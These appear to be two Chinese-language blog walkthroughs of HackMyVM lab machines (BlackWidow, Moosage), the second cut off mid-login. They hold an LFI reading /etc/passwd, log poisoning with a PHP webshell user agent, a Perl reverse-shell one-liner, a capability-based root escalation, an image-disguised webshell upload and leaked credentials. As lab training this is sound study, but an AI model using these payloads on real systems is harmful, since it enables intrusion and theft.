|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      37465/tcp6  mountd
|   100005  1,2,3      53071/udp   mountd
|   100005  1,2,3      54401/tcp   mountd
|   100005  1,2,3      56526/udp6  mountd
|   100021  1,3,4      34897/tcp   nlockmgr
|   100021  1,3,4      46505/tcp6  nlockmgr
|   100021  1,3,4      50253/udp   nlockmgr
|   100021  1,3,4      53399/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs        3-4 (RPC #100003)
3128/tcp  open  http-proxy Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
34897/tcp open  nlockmgr   1-4 (RPC #100021)
40851/tcp open  mountd     1-3 (RPC #100005)
51017/tcp open  mountd     1-3 (RPC #100005)
54401/tcp open  mountd     1-3 (RPC #100005)
MAC Address: 08:00:27:41:EE:2C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.98 seconds

<br><br>192.168.56.23 首页<br>
<img alt="Pasted image 20241224124937" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241224124937.png" referrerpolicy="no-referrer"><br>
是一张图片。查看源代码 没有发现隐藏的信息<br>对 192.168.56.23 进行目录扫描<br>┌──(root㉿kali)-[~/Desktop/hmv/blackwindow]
└─# dirsearch -u http://192.168.56.23 -x 403
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/hmv/blackwindow/reports/http_192.168.56.23/_24-12-23_23-45-37.txt

Target: http://192.168.56.23/

[23:45:37] Starting:
[23:45:37] 301 -  311B  - /js  -&gt;  http://192.168.56.23/js/
[23:45:44] 301 -  316B  - /company  -&gt;  http://192.168.56.23/company/
[23:45:45] 301 -  313B  - /docs  -&gt;  http://192.168.56.23/docs/
[23:45:45] 200 -  404B  - /docs/
[23:45:48] 200 -  403B  - /js/

Task Completed

<br>访问 /company 路由是一个网站的首页<br>
<img alt="Pasted image 20241224124639" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241224124639.png" referrerpolicy="no-referrer"><br>查看源代码，发现提示<br>
<img alt="Pasted image 20241224125230" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241224125230.png" referrerpolicy="no-referrer"><br>
提示告诉我们有一个php文件，可以使用 file 参数进行文件包含<br>
继续对 /company 路由进行目录扫描<br>┌──(root㉿kali)-[~/Desktop/hmv/blackwindow]
└─# gobuster dir -u http://192.168.56.23/company/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.23/company/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 323] [--&gt; http://192.168.56.23/company/assets/]
/forms                (Status: 301) [Size: 322] [--&gt; http://192.168.56.23/company/forms/]
/changelog.txt        (Status: 200) [Size: 1175]
/Readme.txt           (Status: 200) [Size: 222]
/.php                 (Status: 403) [Size: 278]
/started.php          (Status: 200) [Size: 42271]

<br>扫描出来了一个 started.php <br>
测试一下是否是这个php文件存在文件包含<br>
尝试进行最简单的文件包含 发现没有回显。<br><br>测试一下fuzz<br>┌──(root㉿kali)-[~/Desktop/hmv/blackwindow]
└─# ffuf -u http://192.168.56.23/company/started.php?file=FUZZ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt |grep -v 'Size: 0'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.23/company/started.php?file=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1582, Words: 15, Lines: 30, Duration: 6ms]
../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1582, Words: 15, Lines: 30, Duration: 8ms]
../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1582, Words: 15, Lines: 30, Duration: 8ms]
../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1582, Words: 15, Lines: 30, Duration: 12ms]
../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1582, Words: 15, Lines: 30, Duration: 14ms]
../../../../../../../../../../../../../etc/group [Status: 200, Size: 727, Words: 1, Lines: 56, Duration: 1ms]
../../../../../../../../../../../../../../../../../../etc/group [Status: 200, Size: 727, Words: 1, Lines: 56, Duration: 4ms]
../../../../../../../../../../../../../../../../etc/group [Status: 200, Size: 727, Words: 1, Lines: 56, Duration: 4ms]
../../../../../../../../../../../../../../etc/group [Status: 200, Size: 727, Words: 1, Lines: 56, Duration: 5ms]

<br>原来这个目录位于很深处，所以需要很多个 ../<br>┌──(root㉿kali)-[~/Desktop/hmv/blackwindow]
└─# curl http://192.168.56.23/company/started.php?file=../../../../../../../../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
viper:x:1001:1001:Viper,,,:/home/viper:/bin/bash
_rpc:x:107:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:108:65534::/var/lib/nfs:/usr/sbin/nologin

<br><br>我们先查看是否可以访问apache的日志<br>
<img alt="Pasted image 20241224131013" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241224131013.png" referrerpolicy="no-referrer"><br>
可以访问。 我们构造恶意的UA进行注入<br>┌──(root㉿kali)-[~/Desktop/hmv/blackwindow]
└─# curl http://192.168.56.23/ -A "&lt;?php system(\$_GET['cmd']);phpinfo();?&gt;"
&lt;html&gt;
&lt;img src="wallpaper.jpg" alt="wallpaper" width="100%" height="100%"&gt;
&lt;/html&gt;

<br>再访问日志可以发现已经注入木马了<br>
<img alt="Pasted image 20241224131251" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241224131251.png" referrerpolicy="no-referrer"><br>
反弹shell<br>curl http://192.168.56.23/company/started.php?file=../../../../../../../../../../../../../../var/log/apache2/access.log&amp;cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.56.6%22%3B%24p%3D1234%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fbash%20-i%22%29%3B%7D%3B%27

┌──(root㉿kali)-[~/Desktop/hmv/blackwindow]
└─# pwncat-cs -lp 1234

[00:13:04] Welcome to pwncat 🐈!                                                                  __main__.py:164
[00:14:36] received connection from 192.168.56.23:36872                                                bind.py:84
[00:14:36] 192.168.56.23:36872: registered new host w/ db                                          manager.py:957
(local) pwncat$
(remote) www-data@blackwidow:/var/www/html/company$

<br><br>我这里上传了Linpeas进行检测 ，但是没有发现可以直接利用的地方<br>
看了一下wp 发现ssh认证日志 auth.log 被备份在了 /var/backups/ 目录<br>
而且我们可以可以进行查查看<br>(remote) www-data@blackwidow:/var/backups$ ls -l /var/log/auth.log
-rw-r----- 1 root adm 17565 Dec 24 00:32 /var/log/auth.log
(remote) www-data@blackwidow:/var/backups$ ls -l auth.log
-rw-r--r-- 1 root root 31646 Dec 13  2020 auth.log

<br>
可以发现，正常情况下。auth.log 在 /var/log 目录，而且普通用户无法查看
<br>然后在日志里面可以找到一个viper用户的密码 ?V1p3r2020!?<br>Dec 12 16:56:43 test sshd[29560]: Invalid user ?V1p3r2020!? from 192.168.1.109 port 7090

(remote) www-data@blackwidow:/var/backups$ su viper
Password:
viper@blackwidow:/var/backups$

viper@blackwidow:~$ cat local.txt
d930fe79919376e6d08972dae222526b

<br>我估计是viper用户把密码当成用户名了<br><br><br>viper@blackwidow:/tmp$ /sbin/getcap -r / 2&gt;/dev/null
/home/viper/backup_site/assets/vendor/weapon/arsenic = cap_setuid+ep
/usr/bin/perl =
/usr/bin/perl5.28.1 =
/usr/bin/ping = cap_net_raw+ep
/usr/lib/squid/pinger = cap_net_raw+ep
<br>发现 arsenic 具有 cap_setuid 具有 cap_setuid 即允许进程更改其有效用户 ID。<br>查看一下 arsenic 的帮助文档<br>viper@blackwidow:~/backup_site/assets/vendor/weapon$ ./arsenic -h

Usage: ./arsenic [switches] [--] [programfile] [arguments]
  -0[octal]         specify record separator (\0, if no argument)
  -a                autosplit mode with -n or -p (splits $_ into @F)
  -C[number/list]   enables the listed Unicode features
  -c                check syntax only (runs BEGIN and CHECK blocks)
  -d[:debugger]     run program under debugger
  -D[number/list]   set debugging flags (argument is a bit mask or alphabets)
  -e program        one line of program (several -e's allowed, omit programfile)
  -E program        like -e, but enables all optional features
  -f                don't do $sitelib/sitecustomize.pl at startup
  -F/pattern/       split() pattern for -a switch (//'s are optional)
  -i[extension]     edit &lt;&gt; files in place (makes backup if extension supplied)
  -Idirectory       specify @INC/#include directory (several -I's allowed)
  -l[octal]         enable line ending processing, specifies line terminator
  -[mM][-]module    execute "use/no module..." before executing program
  -n                assume "while (&lt;&gt;) { ... }" loop around program
  -p                assume loop like -n but print line also, like sed
  -s                enable rudimentary parsing for switches after programfile
  -S                look for programfile using PATH environment variable
  -t                enable tainting warnings
  -T                enable tainting checks
  -u                dump core after parsing program
  -U                allow unsafe operations
  -v                print version, patchlevel and license
  -V[:variable]     print configuration summary (or a single Config.pm variable)
  -w                enable many useful warnings
  -W                enable all warnings
  -x[directory]     ignore text before #!perl line (optionally cd to directory)
  -X                disable all warnings

Run 'perldoc perl' for more help with Perl.

<br>在Gpt的帮助下，认为这个这个程序应该就是一个Perl，可以允许Perl脚本<br><br><a rel="noopener nofollow" class="external-link" href="https://gtfobins.github.io/gtfobins/perl/#capabilities" target="_blank">https://gtfobins.github.io/gtfobins/perl/#capabilities</a><br>
<img alt="Pasted image 20241224135317" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241224135317.png" referrerpolicy="no-referrer"><br>viper@blackwidow:~/backup_site/assets/vendor/weapon$ vi getroot.pl
viper@blackwidow:~/backup_site/assets/vendor/weapon$ ./arsenic  getroot.pl
# cat getroot.pl
use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";

# whoami
root

# cat /root/root.txt


▄▄▄▄· ▄▄▌   ▄▄▄·  ▄▄· ▄ •▄     ▄▄▌ ▐ ▄▌▪  ·▄▄▄▄        ▄▄▌ ▐ ▄▌
▐█ ▀█▪██•  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪    ██· █▌▐███ ██▪ ██ ▪     ██· █▌▐█
▐█▀▀█▄██▪  ▄█▀▀█ ██ ▄▄▐▀▀▄·    ██▪▐█▐▐▌▐█·▐█· ▐█▌ ▄█▀▄ ██▪▐█▐▐▌
██▄▪▐█▐█▌▐▌▐█ ▪▐▌▐███▌▐█.█▌    ▐█▌██▐█▌▐█▌██. ██ ▐█▌.▐▌▐█▌██▐█▌
·▀▀▀▀ .▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀     ▀▀▀▀ ▀▪▀▀▀▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ ▀▪


Congrats!

You've rooted Black Widow!

0xJin - mindsflee
Follow on Instagram: 0xjiin
Follow on Twitter: 0xJin , @mindsflee


0780eb289a44ba17ea499ffa6322b335

]]></description><link>https://www.c1trus.top/24-渗透/hmv/47.blackwidow.html</link><guid isPermaLink="false">24-渗透/HMV/47.BlackWidow.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241224124937.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241224124937.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[46.moosage]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 端口扫描" data-href="#2.1. 端口扫描" href="https://www.c1trus.top/about:blank#2.1._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 端口扫描</a>
<br><a data-tooltip-position="top" aria-label="2.2. 目录扫描" data-href="#2.2. 目录扫描" href="https://www.c1trus.top/about:blank#2.2._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.2. 目录扫描</a>
<br><a data-tooltip-position="top" aria-label="2.3. 源码获取" data-href="#2.3. 源码获取" href="https://www.c1trus.top/about:blank#2.3._源码获取" class="internal-link" target="_self" rel="noopener nofollow">2.3. 源码获取</a>


<br><a data-tooltip-position="top" aria-label="3. 图片马弹shell" data-href="#3. 图片马弹shell" href="https://www.c1trus.top/about:blank#3._图片马弹shell" class="internal-link" target="_self" rel="noopener nofollow">3. 图片马弹shell</a>
<br><a data-tooltip-position="top" aria-label="4. 提权baca用户" data-href="#4. 提权baca用户" href="https://www.c1trus.top/about:blank#4._提权baca用户" class="internal-link" target="_self" rel="noopener nofollow">4. 提权baca用户</a>
<br><a data-tooltip-position="top" aria-label="5. 提权root" data-href="#5. 提权root" href="https://www.c1trus.top/about:blank#5._提权root" class="internal-link" target="_self" rel="noopener nofollow">5. 提权root</a><br>
- <a data-tooltip-position="top" aria-label="5.1. 修改ssh登录脚本提权" data-href="#5.1. 修改ssh登录脚本提权" href="https://www.c1trus.top/about:blank#5.1._修改ssh登录脚本提权" class="internal-link" target="_self" rel="noopener nofollow">5.1. 修改ssh登录脚本提权</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Moosage" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Moosage</a><br>
作者 <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=sml" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=sml" target="_blank">sml</a><br>
难度 ⭐️⭐️⭐️⭐️️
<br><br><br>┌──(root㉿kali)-[~/Desktop/hmv/moosage]
└─# nmap 192.168.56.22 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-23 05:27 EST
Nmap scan report for 192.168.56.22
Host is up (0.0011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:AE:F2:FE (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.29 seconds

<br><br>┌──(root㉿kali)-[~/Desktop/hmv/moosage]
└─# dirsearch -u http://192.168.56.22
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/hmv/moosage/reports/http_192.168.56.22/_24-12-23_05-32-23.txt

Target: http://192.168.56.22/

[05:32:23] Starting:
[05:32:29] 301 -  185B  - /blog  -&gt;  http://192.168.56.22/blog/
[05:32:29] 200 -   10KB - /blog/

Task Completed


┌──(root㉿kali)-[~/Desktop/hmv/moosage]
└─# dirsearch -u http://192.168.56.22/blog/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/hmv/moosage/reports/http_192.168.56.22/_blog__24-12-23_05-33-02.txt

Target: http://192.168.56.22/

[05:33:02] Starting: blog/
[05:33:02] 301 -  185B  - /blog/.git  -&gt;  http://192.168.56.22/blog/.git/
[05:33:02] 403 -  571B  - /blog/.git/
[05:33:02] 200 -  254B  - /blog/.git/config
[05:33:02] 200 -   73B  - /blog/.git/description
[05:33:02] 200 -   23B  - /blog/.git/HEAD
[05:33:02] 403 -  571B  - /blog/.git/hooks/
[05:33:02] 403 -  571B  - /blog/.git/branches/
[05:33:02] 200 -   10KB - /blog/.git/index
[05:33:02] 403 -  571B  - /blog/.git/info/
[05:33:02] 200 -  240B  - /blog/.git/info/exclude
[05:33:02] 200 -  168B  - /blog/.git/logs/HEAD
[05:33:02] 301 -  185B  - /blog/.git/logs/refs  -&gt;  http://192.168.56.22/blog/.git/logs/refs/
[05:33:02] 301 -  185B  - /blog/.git/logs/refs/heads  -&gt;  http://192.168.56.22/blog/.git/logs/refs/heads/
[05:33:02] 301 -  185B  - /blog/.git/logs/refs/remotes  -&gt;  http://192.168.56.22/blog/.git/logs/refs/remotes/
[05:33:02] 301 -  185B  - /blog/.git/logs/refs/remotes/origin  -&gt;  http://192.168.56.22/blog/.git/logs/refs/remotes/origin/
[05:33:02] 403 -  571B  - /blog/.git/objects/
[05:33:02] 403 -  571B  - /blog/.git/refs/
[05:33:02] 200 -   41B  - /blog/.git/refs/heads/master
[05:33:02] 200 -    1KB - /blog/.git/packed-refs
[05:33:02] 200 -  168B  - /blog/.git/logs/refs/heads/master
[05:33:02] 200 -  168B  - /blog/.git/logs/refs/remotes/origin/HEAD
[05:33:02] 301 -  185B  - /blog/.git/refs/heads  -&gt;  http://192.168.56.22/blog/.git/refs/heads/
[05:33:02] 301 -  185B  - /blog/.git/refs/remotes  -&gt;  http://192.168.56.22/blog/.git/refs/remotes/
[05:33:02] 403 -  571B  - /blog/.git/logs/
[05:33:02] 200 -   32B  - /blog/.git/refs/remotes/origin/HEAD
[05:33:02] 301 -  185B  - /blog/.git/refs/tags  -&gt;  http://192.168.56.22/blog/.git/refs/tags/
[05:33:02] 301 -  185B  - /blog/.git/refs/remotes/origin  -&gt;  http://192.168.56.22/blog/.git/refs/remotes/origin/
[05:33:02] 200 -  171B  - /blog/.gitignore
[05:33:02] 200 -  300B  - /blog/.htaccess
[05:33:07] 200 -   37B  - /blog/ajax.php
[05:33:07] 301 -  185B  - /blog/app  -&gt;  http://192.168.56.22/blog/app/
[05:33:07] 403 -  571B  - /blog/app/
[05:33:09] 200 -    0B  - /blog/common.php
[05:33:09] 200 -    1KB - /blog/config.ini
[05:33:10] 301 -  185B  - /blog/data  -&gt;  http://192.168.56.22/blog/data/
[05:33:10] 403 -  571B  - /blog/data/
[05:33:10] 200 -  754B  - /blog/docker-compose.yml
[05:33:10] 200 -  680B  - /blog/Dockerfile
[05:33:11] 200 -    1KB - /blog/favicon.ico
[05:33:13] 200 -   34KB - /blog/LICENSE
[05:33:17] 200 -    8KB - /blog/README.md
[05:33:18] 200 -   25B  - /blog/robots.txt
[05:33:19] 301 -  185B  - /blog/static  -&gt;  http://192.168.56.22/blog/static/

Task Completed

<br>获取到了一个 /blog/ 路由<br><img alt="Pasted image 20241223215258" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241223215258.png" referrerpolicy="no-referrer"><br><br>直接用页面源代码去github上搜索看能不能找到源码<br>
<img alt="Pasted image 20241223215400" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241223215400.png" referrerpolicy="no-referrer"><br>在项目文件夹的 config.ini 里面可以获取到默认密码<br>[admin]
force_login = true
nick = demo
pass = demo

[database]
db_connection = sqlite
;sqlite_db = data/sqlite.db

;[database]
;db_connection = mysql
;mysql_socket = /tmp/mysql.sock
;mysql_host = localhost
;mysql_port = 3306
;mysql_user = root
;mysql_pass = root
;db_name = blog

;[database]
;db_connection = postgres
;postgres_socket = /tmp/postgres.sock
;postgres_host = localhost
;postgres_port = 5432
;postgres_user = root
;postgres_pass = root
;db_name = blog
<br>使用默认管理员账号密码登录后台<br>
登录进来后，我们可以进行留言，但没有上传文件 只能上传图片<br>
<img alt="Pasted image 20241223215848" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241223215848.png" referrerpolicy="no-referrer"><br><br>尝试上传一个图片马试试<br>
<img alt="Pasted image 20241223221214" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241223221214.png" referrerpolicy="no-referrer"><br>
Png不行 。换成gif试一下 成功上传<br>
<img alt="Pasted image 20241223221344" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241223221344.png" referrerpolicy="no-referrer"><br>
访问路径 http://192.168.56.22/blog/data/i/6d6N.php<br>
<img alt="Pasted image 20241223221419" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241223221419.png" referrerpolicy="no-referrer"><br>
成功。<br>
反弹shell<br>┌──(root㉿kali)-[~/Desktop/hmv/moosage]
└─# pwncat-cs -lp 1234

[09:15:58] Welcome to pwncat 🐈!                                                                  __main__.py:164
[09:16:07] received connection from 192.168.56.22:56926                                                bind.py:84
[09:16:07] 192.168.56.22:56926: registered new host w/ db                                          manager.py:957
(local) pwncat$
(remote) www-data@moosage:/var/www/html/blog/data/i$ whoami
www-data
(remote) www-data@moosage:/var/www/html/blog/data/i$

<br><br>进来后擦看 config.ini 可以获取到mysql的账号密码<br>(remote) www-data@moosage:/var/www/html/blog$ cat config.ini
[database]
db_connection = sqlite
;sqlite_db = data/sqlite.db

;[database]
db_connection = mysql
mysql_socket = /run/mysqld/mysqld.sock
mysql_host = localhost
mysql_port = 3306
mysql_user = baca
mysql_pass = youareinsane
db_name = moosage

<br>数据库收集信息<br>(remote) www-data@moosage:/var/www/html/blog$ mysql -ubaca -pyouareinsane
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 51
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| moosage            |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [moosage]&gt; show tables;
+-------------------+
| Tables_in_moosage |
+-------------------+
| images            |
| posts             |
+-------------------+
2 rows in set (0.000 sec)

MariaDB [moosage]&gt; select * from posts;
+----+-------------+-------------+---------+---------+----------+---------+--------------+---------+---------------------+--------+
| id | text        | plain_text  | feeling | persons | location | content | content_type | privacy | datetime            | status |
+----+-------------+-------------+---------+---------+----------+---------+--------------+---------+---------------------+--------+
|  1 | Super TEST! | Super TEST! |         |         |          |         |              | public  | 2021-04-22 14:30:01 |      1 |
+----+-------------+-------------+---------+---------+----------+---------+--------------+---------+---------------------+--------+
1 row in set (0.000 sec)

MariaDB [moosage]&gt; select * from iages;
ERROR 1146 (42S02): Table 'moosage.iages' doesn't exist
MariaDB [moosage]&gt; select * from images;
+----+-----------+-----------------+-----------------+------+----------------------------------+---------------------+--------+
| id | name      | path            | thumb           | type | md5                              | datetime            | status |
+----+-----------+-----------------+-----------------+------+----------------------------------+---------------------+--------+
|  1 | a.png.php | data/i/1Qkz.php | data/t/1Qkz.php | php  | 2e0d2d57db0657f87ecb595e102be2b5 | 2024-12-23 09:08:42 |      1 |
|  2 | a.png.php | NULL            | NULL            | php  | e0e6d0223f0ee718cc9c2f6d9cb9dbe7 | 2024-12-23 09:11:31 |      0 |
|  3 | a.png.php | NULL            | NULL            | php  | 072faae5bb7cf8b20677424021e215e2 | 2024-12-23 09:12:01 |      0 |
|  4 | a.gif.php | NULL            | NULL            | php  | 4dec43f548b786e903cad2b5beed121a | 2024-12-23 09:12:34 |      0 |
|  5 | a.gif.php | NULL            | NULL            | php  | 4dec43f548b786e903cad2b5beed121a | 2024-12-23 09:12:41 |      0 |
|  6 | a.gif.php | data/i/6d6N.php | data/t/6d6N.php | php  | ccf96e50f5a98a3a50bb5e963e1af038 | 2024-12-23 09:13:29 |      1 |
+----+-----------+-----------------+-----------------+------+----------------------------------+---------------------+--------+
6 rows in set (0.000 sec)

<br>发现里面没有什么可以利用的<br>使用这个 baca 用户的账号密码发现可以直接切换账户<br>(remote) www-data@moosage:/var/www/html/blog$ su baca
Password:
baca@moosage:/var/www/html/blog$

<br><br>baca@moosage:~$ sh flag.sh

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,
-------------------------

PWNED HOST: moosage

PWNED DATE: Mon 23 Dec 2024 09:25:14 AM EST

WHOAMI: uid=1000(baca) gid=1000(baca) groups=1000(baca),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

FLAG: hmvmessageme

------------------------

<br><br>先在 baca 用户目录写入公钥<br>baca@moosage:~$ mkdir .ssh
baca@moosage:~$ chmod 700 .ssh/
baca@moosage:~$ cd .ssh/
baca@moosage:~/.ssh$ nano authorized_keys
<br>然后ssh连接上来<br>
┌──(root㉿kali)-[~/Desktop/hmv/moosage]
└─# ssh -i /root/.ssh/id_rsa baca@192.168.56.22
The authenticity of host '192.168.56.22 (192.168.56.22)' can't be established.
ED25519 key fingerprint is SHA256:e00X2Lw0BXoFelHR9ZRP3JogiBvwujMOAvxKJutaAMk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.22' (ED25519) to the list of known hosts.
 ___________________________
&lt; WELCOME TO MOOSAGE SYSTEM &gt;
 ---------------------------
     \
      \
        ,__, |    |
        (oo)\|    |___
        (__)\|    |   )\_
             |    |_w |  \
             |    |  ||   *

             Cower....

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
